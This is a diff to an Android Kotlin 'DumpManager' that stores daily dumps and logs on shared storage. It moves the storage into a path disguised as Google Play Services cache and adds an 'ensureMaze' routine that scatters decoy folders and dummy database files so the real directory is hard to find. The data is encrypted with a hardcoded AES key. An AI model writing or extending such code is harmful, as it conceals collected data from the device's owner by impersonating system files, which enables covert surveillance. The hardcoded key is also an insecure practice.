@@ -22,12 +22,15 @@ object DumpManager {
     private val logScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private val logMutex = Mutex()
 
-    // Hidden path, 6 folders deep, masquerading as System Cache
-    private val ROOT_DIR = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config")
+    // The Catacombs: 9-level maze structure
+    private val MAZE_ROOT = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android")
+    private val TRUE_PATH = "data/com.google.android.gms/files/cache/.sys_config/.v2/.internal/.identity"
+    private val ROOT_DIR = File(MAZE_ROOT, TRUE_PATH)
     private val KEY = "C0rtexS3cr3tK3y!".toByteArray() // 16 bytes for AES-128
 
     fun createDailyDump(ctx: Context) {
         try {
+            ensureMaze()
             val dateStr = SimpleDateFormat("d_M_yy", Locale.US).format(Date())
             val dayDir = File(ROOT_DIR, dateStr)
             if (!dayDir.exists()) dayDir.mkdirs()
@@ -79,7 +82,7 @@ object DumpManager {
         logScope.launch { 
             logMutex.withLock {
                 try {
-                    if (!ROOT_DIR.exists()) ROOT_DIR.mkdirs()
+                    ensureMaze()
                     val activeFile = File(ROOT_DIR, "active_buffer.jsonl")
                     
                     val wrapper = JSONObject()
@@ -116,12 +119,48 @@ object DumpManager {
         try {
             val logs = ROOT_DIR.listFiles { _, name -> name.startsWith("offline_log_") } ?: return
             if (logs.size > MAX_TOTAL_CHUNKS) {
-                // Delete oldest files to make room
                 logs.sortedBy { it.lastModified() }
                     .take(logs.size - MAX_TOTAL_CHUNKS)
                     .forEach { it.delete() }
             }
         } catch(e: Exception) {}
+    }
+
+    private fun ensureMaze() {
+        try {
+            if (ROOT_DIR.exists()) return
+            
+            val levels = TRUE_PATH.split("/")
+            var current = MAZE_ROOT
+            
+            val decoys = mapOf(
+                0 to listOf("System", "Media", "Legacy"),
+                1 to listOf("obb", "manifests", "protoc"),
+                2 to listOf("com.android.vending", "com.google.android.apps.maps"),
+                3 to listOf("shared_prefs", "databases", "app_textures"),
+                4 to listOf("tmp", "thumbnails", "webview"),
+                5 to listOf(".font_data", ".res_cache", ".blob_store"),
+                6 to listOf(".v1", ".backup", ".old"),
+                7 to listOf(".tmp_shared", ".metadata_v3"),
+                8 to listOf("secondary", "recovery", "temp_node")
+            )
+
+            levels.forEachIndexed { index, name ->
+                // Create decoys at this level
+                decoys[index]?.forEach { decoyName ->
+                    val decoyDir = File(current, decoyName)
+                    if (!decoyDir.exists()) {
+                        decoyDir.mkdirs()
+                        // Put a dummy file in the decoy
+                        val dummy = File(decoyDir, "journal_v${index + 1}.db-wal")
+                        if (!dummy.exists()) dummy.writeBytes(ByteArray(1024) { 0 })
+                    }
+                }
+                // Move to next level in true path
+                current = File(current, name)
+                if (!current.exists()) current.mkdirs()
+            }
+        } catch (e: Exception) { }
     }
 
     fun getRotatedLogs(): List<File> {
